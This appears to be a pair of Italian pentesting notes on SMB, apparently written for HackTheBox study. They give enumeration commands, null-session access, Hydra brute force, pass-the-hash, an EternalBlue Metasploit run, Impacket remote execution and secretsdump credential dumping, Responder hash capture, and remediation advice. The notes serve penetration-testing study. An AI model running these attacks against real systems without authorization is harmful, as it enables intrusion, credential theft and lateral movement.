---

Tipo: Protocollo / Servizio Porta: 445 (SMB diretto) / 139 (NetBIOS) Rischio: 🔴 Alto (dipende dalla configurazione) tags:

- protocollo
- smb
- windows
- enumeration
- null-session
- lateral-movement
- htb/dancing

---

# 🗂️ SMB — Server Message Block

> [!warning] Attenzione SMB è uno dei protocolli più abusati nella storia della sicurezza informatica. Da EternalBlue a WannaCry, passando per share mal configurati e null session — se trovi SMB aperto, è sempre il primo posto dove guardare.

---

## 🧠 Cos'è

SMB (Server Message Block) è un protocollo di rete Microsoft per la condivisione di file, stampanti e risorse tra computer in rete. È il cuore delle reti Windows ed è presente praticamente su ogni macchina Windows aziendale.

|Campo|Valore|
|---|---|
|**Porta principale**|445/TCP (SMB diretto)|
|**Porta legacy**|139/TCP (SMB via NetBIOS)|
|**Protocollo**|TCP|
|**OS principale**|Windows (ma anche Linux via Samba)|
|**Versioni**|SMBv1, SMBv2, SMBv3|

### Versioni di SMB

|Versione|OS|Note|
|---|---|---|
|**SMBv1**|Windows XP / Server 2003|⚠️ Obsoleto e pericolosissimo — EternalBlue|
|**SMBv2**|Windows Vista / Server 2008|Migliorato, ancora diffuso|
|**SMBv3**|Windows 8 / Server 2012+|Crittografia end-to-end, attuale|

> [!danger] SMBv1 SMBv1 dovrebbe essere **sempre disabilitato**. È la versione sfruttata da EternalBlue (CVE-2017-0144), che ha alimentato WannaCry e NotPetya — due dei cyberattacchi più devastanti della storia.

---

## 🔍 Enumeration

### Nmap

```bash
# Scansione base
nmap -sV -sC -p 139,445 <IP>

# Script SMB specifici
nmap -p 445 --script smb-enum-shares <IP>        # lista gli share
nmap -p 445 --script smb-enum-users <IP>         # enumera utenti
nmap -p 445 --script smb-os-discovery <IP>       # info OS
nmap -p 445 --script smb-security-mode <IP>      # modalità sicurezza
nmap -p 445 --script smb-vuln-ms17-010 <IP>      # test EternalBlue
nmap -p 445 --script smb2-security-mode <IP>     # sicurezza SMBv2

# Tutti gli script SMB in una volta
nmap -p 445 --script "smb-*" <IP>
```

### smbclient

```bash
# Lista tutti gli share disponibili (null session)
smbclient -L <IP>
smbclient -L <IP> -N                    # -N = no password

# Lista con credenziali
smbclient -L <IP> -U utente%password

# Connessione a uno share specifico
smbclient //<IP>/<share> -N
smbclient //<IP>/<share> -U utente%password
```

### enum4linux / enum4linux-ng

```bash
# Enumerazione completa automatica
enum4linux -a <IP>
enum4linux-ng <IP>                      # versione moderna, preferibile
```

### CrackMapExec (CME) / NetExec

```bash
# Enumera SMB e verifica credenziali
crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''       # null session
crackmapexec smb <IP> -u utente -p password
crackmapexec smb <IP> --shares          # lista share
crackmapexec smb <IP> --users           # lista utenti
crackmapexec smb <IP> --groups          # lista gruppi
```

---

## 🗃️ Tipi di Share Windows

|Share|Tipo|Descrizione|
|---|---|---|
|`ADMIN$`|Amministrativo|Mappa su `C:\Windows` — richiede admin|
|`C$`|Amministrativo|Radice del disco C — richiede admin|
|`IPC$`|IPC|Inter-Process Communication — spesso accessibile in null session|
|`SYSVOL`|Sistema|Policy di dominio (solo DC)|
|`NETLOGON`|Sistema|Script di login (solo DC)|
|_Custom_|Utente|Share creati manualmente — spesso mal configurati|

> [!tip] Share custom = primo obiettivo Gli share amministrativi (`ADMIN$`, `C$`) richiedono privilegi. Quelli custom creati dagli utenti sono quasi sempre il punto debole — come `WorkShares` su Dancing.

---

## 💥 Exploitation

### 1. Null Session (accesso senza credenziali)

```bash
# Connessione allo share senza password
smbclient //<IP>/<share> -N

# Comandi utili una volta dentro
smb: \> ls                  # lista file
smb: \> cd <dir>            # cambia directory
smb: \> get <file>          # scarica file
smb: \> mget *              # scarica tutto
smb: \> put <file>          # carica file
smb: \> exit                # esci
```

### 2. Brute force

```bash
# Hydra
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://<IP>

# CrackMapExec (più affidabile per SMB)
crackmapexec smb <IP> -u users.txt -p passwords.txt
crackmapexec smb <IP> -u Administrator -p passwords.txt
```

### 3. Pass-the-Hash

Se ottieni un hash NTLM (da mimikatz, secretsdump, ecc.) puoi autenticarti senza conoscere la password in chiaro:

```bash
crackmapexec smb <IP> -u Administrator -H <NTLM_hash>
smbclient //<IP>/share -U Administrator%'' --pw-nt-hash <NTLM_hash>
```

### 4. EternalBlue — CVE-2017-0144 (SMBv1)

```bash
# Con Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP>
set LHOST <tuo_IP>
run
```

> [!danger] EternalBlue Funziona solo su sistemi **non patchati** con **SMBv1 abilitato** (Windows 7, Server 2008 e precedenti senza patch MS17-010). Verificare sempre con `nmap --script smb-vuln-ms17-010` prima di tentare.

---

## 🔍 Movimento laterale con SMB

Una volta ottenute credenziali valide, SMB è uno dei vettori principali per muoversi lateralmente in una rete:

```bash
# Esecuzione remota di comandi (richiede admin)
crackmapexec smb <IP> -u Administrator -p password -x "whoami"
crackmapexec smb <IP> -u Administrator -p password -X "Get-Process"  # PowerShell

# PsExec-style con Impacket
impacket-psexec Administrator:password@<IP>
impacket-smbexec Administrator:password@<IP>
impacket-wmiexec Administrator:password@<IP>

# Dump credenziali remote (richiede admin)
impacket-secretsdump Administrator:password@<IP>
```

---

## 📋 Comandi smbclient completi

|Comando|Descrizione|
|---|---|
|`ls` / `dir`|Lista file e directory|
|`cd <dir>`|Cambia directory|
|`pwd`|Directory corrente|
|`get <file>`|Scarica un file|
|`mget *`|Scarica tutti i file (chiede conferma)|
|`put <file>`|Carica un file|
|`mkdir <dir>`|Crea directory|
|`del <file>`|Elimina file|
|`recurse ON`|Abilita operazioni ricorsive|
|`prompt OFF`|Disabilita conferme (utile con mget)|
|`help`|Lista comandi disponibili|
|`exit`|Chiude la sessione|

---

## 🧪 Visto in azione

|Macchina|Piattaforma|Come usato|
|---|---|---|
|[[Macchine/Dancing\|Dancing]]|HackTheBox|Null session su share `WorkShares` → `flag.txt` in `James.P/`|

---

## 🛡️ Remediation (per il report)

- Disabilitare **SMBv1** immediatamente (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`)
- Disabilitare le null session (`RestrictNullSessAccess = 1`)
- Limitare gli share con permessi appropriati — nessuno share dovrebbe essere accessibile a `Everyone`
- Bloccare la porta 445 sul perimetro — SMB non dovrebbe mai essere esposto su Internet
- Applicare il patch **MS17-010** su tutti i sistemi legacy
- Abilitare **SMB Signing** per prevenire attacchi NTLM relay

---

## 🔗 Riferimenti

- [HackTricks — Pentesting SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [CVE-2017-0144 — EternalBlue](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [CrackMapExec Wiki](https://wiki.porchetta.industries/)
- [[HackTheBox/Vulnerabilities/SSH|SSH]] — alternativa sicura per accesso remoto
- [[Vulnerabilità/Pass-the-Hash|Pass-the-Hash]]
- [[Vulnerabilità/Null Session|Null Session]]


# SMB — Server Message Block

**Porta:** `445/tcp` · `139/tcp` (legacy NetBIOS)  
**OS:** Windows  
**Categoria:** #protocollo #windows #network #exploitation  
**Relazioni:** [[NTLM]] [[HackTheBox/Tools/Responder]] [[WinRM]]

---

## 📖 Cos'è

SMB è il protocollo Windows per la **condivisione di risorse in rete** — file, cartelle, stampanti. È quello che si usa quando si accede a `\\SERVER\cartella` su Windows. È uno dei protocolli più attaccati in assoluto nel pentesting Windows.

---

## 🔄 Come funziona

```
Client                          Server
  |                               |
  |-- 1. Negoziazione ----------> |
  |      "che versione SMB usi?"  |
  |                               |
  |-- 2. Autenticazione --------> |
  |      (NTLM o Kerberos)        |
  |                               |
  |-- 3. Richiesta risorsa -----> |
  |      "dammi \\server\share"   |
  |                               |
  | <-- 4. Risposta ------------- |
  |      contenuto della cartella |
```

> ⚠️ L'autenticazione avviene al passo 2 — **prima** di verificare se la risorsa esiste. Questo è ciò che sfrutta [[HackTheBox/Tools/Responder]].

---

## 📊 Versioni

|Versione|OS|Note|
|---|---|---|
|SMBv1|Windows XP/2003|Obsoleto, vulnerabile a EternalBlue|
|SMBv2|Windows Vista+|Performance migliorate|
|SMBv3|Windows 8/2012+|Supporta cifratura end-to-end|

---

## 🔍 Enumeration

```bash
# Nmap scan SMB
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery <IP>

# Versione SMB
nmap -p 445 --script smb-protocols <IP>

# Verifica vulnerabilità EternalBlue
nmap -p 445 --script smb-vuln-ms17-010 <IP>
```

### Smbclient — accesso anonimo

```bash
# Lista shares disponibili
smbclient -L //<IP>/ -N

# Accedi a uno share anonimamente
smbclient //<IP>/<share> -N

# Con credenziali
smbclient //<IP>/<share> -U <utente>
```

### CrackMapExec

```bash
# Enumera shares
crackmapexec smb <IP> --shares

# Verifica credenziali
crackmapexec smb <IP> -u <utente> -p <password>

# Pass-the-Hash
crackmapexec smb <IP> -u <utente> -H <NTHash>
```

---

## 💥 Attacchi principali

### 1. Accesso anonimo / guest

```bash
smbclient -L //<IP>/ -N
# Cerca share accessibili senza credenziali
```

### 2. EternalBlue (MS17-010)

Exploit NSA che colpisce SMBv1 — usato in WannaCry e NotPetya:

```bash
# Verifica
nmap -p 445 --script smb-vuln-ms17-010 <IP>

# Exploit con Metasploit
use exploit/windows/smb/ms17_010_eternalblue
```

### 3. Responder — cattura hash NTLM

```bash
sudo responder -I tun0
# Poi forza autenticazione SMB tramite LFI con UNC path
# ?page=//TUO_IP/share
```

### 4. Pass-the-Hash

```bash
evil-winrm -i <IP> -u <utente> -H <NTHash>
crackmapexec smb <IP> -u <utente> -H <NTHash>
```

---

## ⚠️ Misconfiguration comuni

- **Accesso anonimo** abilitato → lettura share senza credenziali
- **SMBv1 abilitato** → vulnerabile a EternalBlue
- **Share con dati sensibili** esposti (credenziali, backup, config)
- **Porta 445 esposta su internet** → bersaglio immediato

---

## 📚 Lezioni apprese

- SMB autentica **prima** di verificare se la risorsa esiste → sfruttato da Responder
- Porta 445 va sempre scansionata su macchine Windows
- SMBv1 è obsoleto e pericoloso — se lo vedi attivo è un flag rosso
- `smbclient -N` testa l'accesso anonimo — sempre da provare
- Gli share SMB possono contenere file con credenziali in chiaro

---

## 🔗 Riferimenti

- [[NTLM]]
- [[HackTheBox/Tools/Responder]]
- [[WinRM]]
- [HackTricks - SMB](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb)
- [EternalBlue - MS17-010](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)

---

## Tags

#smb #windows #protocollo #port-445 #eternalblue #responder #ntlm #pass-the-hash #enumeration #exploitation